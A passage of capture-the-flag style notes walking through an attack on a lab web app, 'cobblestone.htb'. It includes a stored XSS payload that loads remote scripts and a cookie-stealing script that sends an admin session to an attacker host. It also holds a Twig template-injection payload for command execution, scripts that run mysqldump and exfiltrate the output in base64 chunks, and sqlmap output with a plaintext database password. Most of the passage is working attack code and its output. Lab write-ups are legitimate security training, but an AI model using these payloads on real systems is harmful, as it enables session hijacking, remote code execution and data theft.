10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=5&r=ZG93bmxvYWQucGhwP3NraW49L3NraW5zL2VsZGVhdGhseS5wbmciPjxpIGNsYXNzPSJmYXMgZmEtZG93bmxvYWQgdGV4dC1saWdodCI+PC9pPjwvYT4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgICAgICA8dHIgc2NvcGU9InJvdyI+CiAgICAgICAgPHRkIGNsYXNzPSJ0ZXh0LWxpZ2h0IHRleHQtYm9sZCIgaWQ9IjMiPgogICAgICAgIERvZzEyMzQKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGltZyBzcmM9Ii9za2lucy9wcmV2aWV3X2RvZzEyMzQucG5nIiBhbHQ9IkRvZzEyMzQiIGhlaWdodD0iMTUwcHgiIC8+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxhIGhyZWY9ImRvd25sb2FkLnBocD9za2luPS9za2lucy9kb2cxMjM0LnBuZyI+PGkgY2xhc3M9ImZhcyBmYS1kb3dubG9hZCB0ZXh0LWxpZ2h0Ij48L2k+PC9hPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgICAgIDx0ciBzY29wZT0icm93Ij4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIiBpZD0iNCI+CiAgICAgICAgUGF1bEdHCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxpbWcg HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=0&r=PCEtLSBQcm91ZGx5IGNvZGVkIGJ5IEJpbGx5IChodHRwczovL2J5YmlsbHkudWspIC0tPg0KPCEtLSBWZXJzaW9uOiAxLjkuMiAtLT4NCg0KDQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQoJPCEtLSBJbmZvIG1ldGEgdGFncywgaW1wb3J0YW50IGZvciBzb2NpYWwgbWVkaWEgKyBTRU8gLS0+DQoJPHRpdGxlPkNvYmJsZXN0b25lIC0gU2tpbnM8L3RpdGxlPg0KDQoJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+DQoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYWxsLm1pbi5jc3MiPg0KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlc2hlZXQuY3NzIj4NCg0KPC9oZWFkPg0KPGJvZHk+DQoJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCgkJPGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSBhZG1pbjwvaDE+DQoJICAgIDwhLS0gVGFicyBOYXZpZ2F0aW9uIC0t HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=0&r=dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIj4KICAgICAgICAgICAgc2tpbnMKICAgICAgICA8L3RkPgogICAgICAgIDx0ZCBjbGFzcz0ic3VnZ2VzdGlvbi11cmwgdGV4dC1saWdodCB0ZXh0LWJvbGQiPgogICAgICAgICAgICA8aW1nIHNyYz14IG9uZXJyb3I9InZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPSdodHRwOi8vMTAuMTAuMTYuMTI2L2luZGV4LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpIj4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIiBvbmNsaWNrPSJhbGVydCgnTm90IHlldCBpbXBsZW1lbnRlZCcpIj5BcHByb3ZlPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tZGFuZ2VyIiBvbmNsaWNrPSJhbGVydCgnTm90IHlldCBpbXBsZW1lbnRlZCcpIj5EZWNsaW5lPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CgogICAgICAgIDx0ciBzY29wZT0icm93Ij4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1i HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=1&r=Pg0KICAgICAgICA8dWwgY2xhc3M9Im5hdiBuYXYtdGFicyIgaWQ9InNraW5zQWRtaW5UYWJzIiByb2xlPSJ0YWJsaXN0Ij4NCiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iIHJvbGU9InByZXNlbnRhdGlvbiI+DQogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIHRleHQtZGFyayIgaWQ9InNraW5zLXRhYiIgZGF0YS1icy10b2dnbGU9InRhYiIgZGF0YS1icy10YXJnZXQ9IiNza2lucyIgdHlwZT0iYnV0dG9uIiByb2xlPSJ0YWIiIGFyaWEtY29udHJvbHM9InNraW5zIiBhcmlhLXNlbGVjdGVkPSJ0cnVlIj5Ta2luczwvYnV0dG9uPg0KICAgICAgICAgICAgPC9saT4NCgkJCQkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iIHJvbGU9InByZXNlbnRhdGlvbiI+DQoJPGJ1dHRvbiBjbGFzcz0ibmF2LWxpbmsgdGV4dC1kYXJrIiBpZD0idXBsb2FkLXRhYiIgZGF0YS1icy10b2dnbGU9InRhYiIgZGF0YS1icy10YXJnZXQ9IiN1cGxvYWQiIHR5cGU9ImJ1dHRvbiIgcm9sZT0idGFiIiBhcmlhLWNvbnRyb2xzPSJ1cGxvYWQiIGFyaWEtc2VsZWN0ZWQ9ImZhbHNlIj5VcGxvYWQgU2tpbjwvYnV0dG9uPg0KPC9saT4NCjxsaSBj HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=1&r=b2xkIiBpZD0iMiI+CiAgICAgICAgICAgIDIKICAgICAgICA8L3RkPgogICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCB0ZXh0LWJvbGQiPgogICAgICAgICAgICB0ZXN0CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIj4KICAgICAgICAgICAgc2tpbnMKICAgICAgICA8L3RkPgogICAgICAgIDx0ZCBjbGFzcz0ic3VnZ2VzdGlvbi11cmwgdGV4dC1saWdodCB0ZXh0LWJvbGQiPgogICAgICAgICAgICA8aW1nIHNyYz14IG9uZXJyb3I9InZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Muc3JjPSdodHRwOi8vMTAuMTAuMTYuMTI2L3NraW5zLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpIj4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIiBvbmNsaWNrPSJhbGVydCgnTm90IHlldCBpbXBsZW1lbnRlZCcpIj5BcHByb3ZlPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tZGFuZ2VyIiBvbmNsaWNrPSJhbGVydCgnTm90 HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=2&r=bGFzcz0ibmF2LWl0ZW0iIHJvbGU9InByZXNlbnRhdGlvbiI+DQoJPGJ1dHRvbiBjbGFzcz0ibmF2LWxpbmsgdGV4dC1kYXJrIiBpZD0idXNlci10YWIiIGRhdGEtYnMtdG9nZ2xlPSJ0YWIiIGRhdGEtYnMtdGFyZ2V0PSIjdXNlciIgdHlwZT0iYnV0dG9uIiByb2xlPSJ0YWIiIGFyaWEtY29udHJvbHM9InVzZXIiIGFyaWEtc2VsZWN0ZWQ9ImZhbHNlIj5Vc2VyIE1hbmFnZW1lbnQ8L2J1dHRvbj4NCjwvbGk+DQo8bGkgY2xhc3M9Im5hdi1pdGVtIiByb2xlPSJwcmVzZW50YXRpb24iPg0KCTxidXR0b24gY2xhc3M9Im5hdi1saW5rIHRleHQtZGFyayIgaWQ9InN1Z2dlc3QtdGFiIiBkYXRhLWJzLXRvZ2dsZT0idGFiIiBkYXRhLWJzLXRhcmdldD0iI3N1Z2dlc3QiIHR5cGU9ImJ1dHRvbiIgcm9sZT0idGFiIiBhcmlhLWNvbnRyb2xzPSJzdWdnZXN0IiBhcmlhLXNlbGVjdGVkPSJmYWxzZSI+U2tpbiBTdWdnZXN0aW9uczwvYnV0dG9uPg0KPC9saT4gICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIiByb2xlPSJwcmVzZW50YXRpb24iPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9ImxvZ291dC5waHAiIGNsYXNzPSJuYXYtbGluayB0ZXh0LWRhcmsiIGlk HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=2&r=IHlldCBpbXBsZW1lbnRlZCcpIj5EZWNsaW5lPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CgogICAgPC90YWJsZT4KCQkJPC9kaXY+DQoJCTwvZGl2Pg0KCQk8Zm9vdGVyIGNsYXNzPSJtdC1hdXRvIj4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIG1iLTMiPgogICAgICAgIDxwPjxhIGNsYXNzPSJ0ZXh0LWJvbGQgdGV4dC1saWdodCIgaHJlZj0ic2tpbnNfYXBwX2FkbWluX3NlcnZlcl9pbmZvLnBocCIgdGFyZ2V0PSJfYmxhbmsiPkFkbWluIHNlcnZlciBpbmZvPC9hPjwvcD4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9mb290ZXI+Cgk8L2Rpdj4NCg0KICAgIDxzY3JpcHQ+DQogICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQoNCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5Lm1pbi5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4NCiAgICA8c2NyaXB0IHNyYz0ianMv HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=3&r=PSJsb2dvdXQtdGFiIiB0eXBlPSJidXR0b24iIHJvbGU9InRhYiIgYXJpYS1jb250cm9scz0iYWRtaW4iIGFyaWEtc2VsZWN0ZWQ9ImZhbHNlIj5Mb2dvdXQ8L2E+DQogICAgICAgICAgICA8L2xpPg0KICAgICAgICA8L3VsPg0KDQogICAgICAgIDwhLS0gU2tpbnMgQ29udGVudCAtLT4NCiAgICAgICAgPGRpdiBjbGFzcz0idGFiLWNvbnRlbnQiIGlkPSJza2luc0FkbWluVGFic0NvbnRlbnQiPg0KCQkJPGRpdiBjbGFzcz0idGFiLXBhbmUgZmFkZSBzaG93IGFjdGl2ZSBwLTQiIGlkPSJza2lucyIgcm9sZT0idGFicGFuZWwiIGFyaWEtbGFiZWxsZWRieT0ic2tpbnMtdGFiIj4NCgkJCQk8dGFibGUgY2xhc3M9InRhYmxlIHRhYmxlLWRhcmsgdGFibGUtc3RyaXBlZCB0YWJsZS1saWdodCI+CiAgICA8dGhlYWQ+CiAgICAgICAgPHRyIGNsYXNzPSJ0YWJsZS1kYXJrIj4KICAgICAgICAgICAgPHRoIHNjb3BlPSJjb2wiPk5hbWU8L3RoPgogICAgICAgICAgICA8dGggc2NvcGU9ImNvbCI+UHJldmlldzwvdGg+CiAgICAgICAgICAgIDx0aCBzY29wZT0iY29sIj5Eb3dubG9hZDwvdGg+CiAgICAgICAgPC90cj4KICAgIDwvdGhlYWQ+CiAgICAgICAgPHRyIHNjb3Bl HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=3&r=Ym9vdHN0cmFwLmJ1bmRsZS5taW4uanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQoJPHNjcmlwdCBzcmM9ImpzL2ZpcmVmbHkuanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQoJPHNjcmlwdCBzcmM9ImpzL21haW4uanMiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+PC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+DQo= HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:08] "GET /?i=4&r=PSJyb3ciPgogICAgICAgIDx0ZCBjbGFzcz0idGV4dC1saWdodCB0ZXh0LWJvbGQiIGlkPSIxIj4KICAgICAgICBTd29yZDQwMDAKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGltZyBzcmM9Ii9za2lucy9wcmV2aWV3X3N3b3JkNDAwMC5wbmciIGFsdD0iU3dvcmQ0MDAwIiBoZWlnaHQ9IjE1MHB4IiAvPgogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8YSBocmVmPSJkb3dubG9hZC5waHA/c2tpbj0vc2tpbnMvc3dvcmQ0MDAwLnBuZyI+PGkgY2xhc3M9ImZhcyBmYS1kb3dubG9hZCB0ZXh0LWxpZ2h0Ij48L2k+PC9hPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgICAgIDx0ciBzY29wZT0icm93Ij4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIiBpZD0iMiI+CiAgICAgICAgRWxEZWF0aGx5CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxpbWcgc3JjPSIvc2tpbnMvcHJldmlld19lbGRlYXRobHkucG5nIiBhbHQ9IkVsRGVhdGhseSIgaGVpZ2h0PSIxNTBweCIgLz4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGEgaHJlZj0i HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:09] "GET /?i=5&r=ZG93bmxvYWQucGhwP3NraW49L3NraW5zL2VsZGVhdGhseS5wbmciPjxpIGNsYXNzPSJmYXMgZmEtZG93bmxvYWQgdGV4dC1saWdodCI+PC9pPjwvYT4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgICAgICA8dHIgc2NvcGU9InJvdyI+CiAgICAgICAgPHRkIGNsYXNzPSJ0ZXh0LWxpZ2h0IHRleHQtYm9sZCIgaWQ9IjMiPgogICAgICAgIERvZzEyMzQKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGltZyBzcmM9Ii9za2lucy9wcmV2aWV3X2RvZzEyMzQucG5nIiBhbHQ9IkRvZzEyMzQiIGhlaWdodD0iMTUwcHgiIC8+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxhIGhyZWY9ImRvd25sb2FkLnBocD9za2luPS9za2lucy9kb2cxMjM0LnBuZyI+PGkgY2xhc3M9ImZhcyBmYS1kb3dubG9hZCB0ZXh0LWxpZ2h0Ij48L2k+PC9hPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgICAgIDx0ciBzY29wZT0icm93Ij4KICAgICAgICA8dGQgY2xhc3M9InRleHQtbGlnaHQgdGV4dC1ib2xkIiBpZD0iNCI+CiAgICAgICAgUGF1bEdHCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxpbWcg HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 10:29:09] "GET /?i=6&r=c3JjPSIvc2tpbnMvcHJldmlld19wYXVsZ2cucG5nIiBhbHQ9IlBhdWxHRyIgaGVpZ2h0PSIxNTBweCIgLz4KICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGEgaHJlZj0iZG93bmxvYWQucGhwP3NraW49L3NraW5zL3BhdWxnZy5wbmciPjxpIGNsYXNzPSJmYXMgZmEtZG93bmxvYWQgdGV4dC1saWdodCI+PC9pPjwvYT4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgICAgICA8dHIgc2NvcGU9InJvdyI+CiAgICAgICAgPHRkIGNsYXNzPSJ0ZXh0LWxpZ2h0IHRleHQtYm9sZCIgaWQ9IjUiPgogICAgICAgIE5pZnR5U21pdGgKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPGltZyBzcmM9Ii9za2lucy9wcmV2aWV3X25pZnR5c21pdGgucG5nIiBhbHQ9Ik5pZnR5U21pdGgiIGhlaWdodD0iMTUwcHgiIC8+CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDxhIGhyZWY9ImRvd25sb2FkLnBocD9za2luPS9za2lucy9uaWZ0eXNtaXRoLnBuZyI+PGkgY2xhc3M9ImZhcyBmYS1kb3dubG9hZCB0ZXh0LWxpZ2h0Ij48L2k+PC9hPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPC90YWJsZT4J HTTP/1.1" 200 -
```

- Decoding it we find where phpinfo is:
```
echo "IHlldCBpbXBsZW1lbnRlZCcpIj5EZWNsaW5lPC9idXR0b24+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CgogICAgPC90YWJsZT4KCQkJPC9kaXY+DQoJCTwvZGl2Pg0KCQk8Zm9vdGVyIGNsYXNzPSJtdC1hdXRvIj4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIG1iLTMiPgogICAgICAgIDxwPjxhIGNsYXNzPSJ0ZXh0LWJvbGQgdGV4dC1saWdodCIgaHJlZj0ic2tpbnNfYXBwX2FkbWluX3NlcnZlcl9pbmZvLnBocCIgdGFyZ2V0PSJfYmxhbmsiPkFkbWluIHNlcnZlciBpbmZvPC9hPjwvcD4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9mb290ZXI+Cgk8L2Rpdj4NCg0KICAgIDxzY3JpcHQ+DQogICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQoNCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5Lm1pbi5qcyIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij48L3NjcmlwdD4NCiAgICA8c2NyaXB0IHNyYz0ianMv" | base64 -d
 yet implemented')">Decline</button>
        </td>
    </tr>

    </table>
                        </div>
                </div>
                <footer class="mt-auto">
  <div class="container">
    <div class="row">
      <div class="col-md-12 mb-3">
        <p><a class="text-bold text-light" href="skins_app_admin_server_info.php" target="_blank">Admin server info</a></p>
      </div>
    </div>
  </div>
</footer>
        </div>

    <script>
         document.addEventListener("DOMContentLoaded", function () {
                        });
    </script>

        <script src="js/jquery.min.js" type="text/javascript"></script>
    <script src="js/                                
```

![[Pasted image 20260506123653.png]]

- In here we can see our cookie.
- We can grab the cookie of the admin by accessing this page via the xss payload
```
cat steal.js 
(async () => {
  const H = 'http://10.10.16.126:4444';
  let r = await fetch('http://cobblestone.htb/skins_app_admin_server_info.php');
  let t = await r.text();
  
  // Extract just the HTTP_COOKIE line
  const match = t.match(/HTTP_COOKIE.*?<\/td>\s*<td[^>]*>(.*?)<\/td>/s);
  if(match) {
    await fetch(H + '/?cookie=' + encodeURIComponent(match[1]));
  } else {
    // Try alternative extraction
    const match2 = t.match(/PHPSESSID[^<"&]*/);
    if(match2) await fetch(H + '/?cookie=' + encodeURIComponent(match2[0]));
  }
})();
```

- We call it via our exploit and get the cookie as a response:
![[Pasted image 20260506141121.png]]
- we get the cookie : `skqkk77dgr5q8crb22njue9koa`
- We copy it into the cookies of our session at `cobblestone.htb`
![[Pasted image 20260506135004.png]]

- We refresh the page:
![[Pasted image 20260506135033.png]]

- we are at the admin panel and can go to UserManagement. With burpsuite or just analysing the network with inspecter we see a call to preview_banner.php when we click the preview button:
![[Pasted image 20260506135237.png]]
![[Pasted image 20260506135328.png]]

- I change the input to a basic payload test and i see the user is www-data:
```
POST /preview_banner.php HTTP/1.1
Host: cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://cobblestone.htb/skins.php
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 40
Origin: http://cobblestone.htb
Connection: keep-alive
Cookie: PHPSESSID=skqkk77dgr5q8crb22njue9koa
Priority: u=0

first={{['whoami']|map('system')|join}}"
```
![[Pasted image 20260506135948.png]]


- Alternatively Create a test payload to test some endpoints `xsstest.js` with the target to be previwe_banner.php:
```
(async () => {
  const B = 'http://cobblestone.htb/preview_banner.php';
  const H = 'http://10.10.16.126:4444';
  const cmd = "whoami";
  
  let r = await fetch(B, {
    method:'POST', 
    headers:{'Content-Type':'application/x-www-form-urlencoded'}, 
    body:'first='+encodeURIComponent("{{['"+cmd+"']|map('system')|join}}")
  });
  
  let t = await r.text();
  const clean = btoa(unescape(encodeURIComponent(t)));
  for(let i=0; i*800 < clean.length; i++){
    await fetch(H+'/?i='+i+'&r='+clean.substr(i*800, 800));
  }
})();
```
- I pass the exploit at `cobblestone.htb/suggest_skin.php`
```
<img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/xsstest.js';document.body.appendChild(s)">
```
![[Pasted image 20260506112427.png]]
- It returns a base64 value to my python srver posted at port 4444:
```
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.48.200 - - [06/May/2026 11:19:08] "GET /?i=0&r=PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSB3d3ctZGF0YQp3d3ctZGF0YTwvaDE+ HTTP/1.1" 200 -

```
![[Pasted image 20260506112603.png]]
![[Pasted image 20260506112452.png]]
- Decoding it gives us the response `www-data`
```
echo "PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSB3d3ctZGF0YQp3d3ctZGF0YTwvaDE+" | base64 -d
<h1 class="text-light display-3">Welcome www-data
www-data</h1> 
```
![[Pasted image 20260506112653.png]]
- We could dump sql creds here but we have voteuser creds only. We could search for the creds for this database user via the html path:
```
sqlmap -r req --batch --file-read /var/www/html/db/connection.php
        ___
       __H__                                                                                                                        
 ___ ___["]_____ ___ ___  {1.10.3#stable}                                                                                           
|_ -| . [.]     | .'| . |                                                                                                           
|___|_  [(]_|_|_|__,|  _|                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:49:29 /2026-05-06/

[14:49:29] [INFO] parsing HTTP request from 'req'
[14:49:29] [INFO] resuming back-end DBMS 'mysql' 
[14:49:29] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/login.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=test' AND 8220=8220-- avxg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=test' AND (SELECT 4523 FROM (SELECT(SLEEP(5)))Muhp)-- AOAp

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7142' UNION ALL SELECT CONCAT(0x716a6b6b71,0x62724d4c69674e41576668696151415a4b484c6a6c746b59736b6d736a784b7a59494364444e4d59,0x716a627671),NULL,NULL,NULL,NULL-- -
---
[14:49:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:49:30] [INFO] fingerprinting the back-end DBMS operating system
[14:49:30] [INFO] the back-end DBMS operating system is Linux
[14:49:30] [INFO] fetching file: '/var/www/html/db/connection.php'
do you want confirmation that the remote file '/var/www/html/db/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[14:49:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:49:30] [INFO] retrieved: 
[14:49:32] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[14:49:32] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_db_connection.php (size differs from remote file)

[14:49:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 14:49:32 /2026-05-06/
```
![[Pasted image 20260506145014.png]]
![[Pasted image 20260506145028.png]]

- Reading the file I get another set of credentials for `dbuser`:`aichooDeeYanaekungei9rogi0eMuo2o`
```
cat /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_db_connection.php
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

- We can replace it with our payload and read the sqldump `xploit.js` (reverse shell fails probably due to restricted shell):
```
cat xploit.js 
(async () => {
  const B = 'http://cobblestone.htb/preview_banner.php';
  const H = 'http://10.10.16.126:4444';
  const cmd = "mysqldump -h127.0.0.1 -udbuser -paichooDeeYanaekungei9rogi0eMuo2o cobblestone users";
  
  let r = await fetch(B, {
    method:'POST', 
    headers:{'Content-Type':'application/x-www-form-urlencoded'}, 
    body:'first='+encodeURIComponent("{{['"+cmd+"']|map('system')|join}}")
  });
  
  let t = await r.text();
  const clean = btoa(unescape(encodeURIComponent(t)));
  for(let i=0; i*800 < clean.length; i++){
    await fetch(H+'/?i='+i+'&r='+clean.substr(i*800, 800));
  }
})();
```


- We pass it the same way and read the response:
```
<img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.126/xploit.js';document.body.appendChild(s)">
```
![[Pasted image 20260506145233.png]]


- It downloads and we get a response:
![[Pasted image 20260506145341.png]]
![[Pasted image 20260506145325.png]]
```
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.48.200 - - [06/May/2026 11:34:07] "GET /?i=0&r=PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSA8L2gxPg== HTTP/1.1" 200 -
10.129.48.200 - - [06/May/2026 11:34:07] "GET /?i=0&r=PGgxIGNsYXNzPSJ0ZXh0LWxpZ2h0IGRpc3BsYXktMyI+V2VsY29tZSAvKk0hOTk5OTk5XC0gZW5hYmxlIHRoZSBzYW5kYm94IG1vZGUgKi8gCi0tIE1hcmlhREIgZHVtcCAxMC4xOS0xMi4wLjItTWFyaWFEQiwgZm9yIGRlYmlhbi1saW51eC1nbnUgKHg4Nl82NCkKLS0KLS0gSG9zdDogMTI3LjAuMC4xICAgIERhdGFiYXNlOiBjb2JibGVzdG9uZQotLSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0gU2VydmVyIHZlcnNpb24JMTIuMC4yLU1hcmlhREItZGViMTItbG9nCgovKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX0NMSUVOVD1AQENIQVJBQ1RFUl9TRVRfQ0xJRU5UICovOwovKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX1JFU1VMVFM9QEBDSEFSQUNURVJfU0VUX1JFU1VMVFMgKi87Ci8qITQwMTAxIFNFVCBAT0xEX0NPTExBVElPTl9DT05ORUNUSU9OPUBAQ09MTEFUSU9OX0NPTk5FQ1RJT04gKi87Ci8qITQwMTAxIFNFVCBOQU1FUyB1dGY4bWI0ICovOwovKiE0MDEwMyBTRVQgQE9MRF9USU1FX1pPTkU9QEBUSU1FX1pPTkUgKi87Ci8qITQwMTAzIFNFVCBUSU1FX1pPTkU9JiMw HTTP/1.1" 200 -
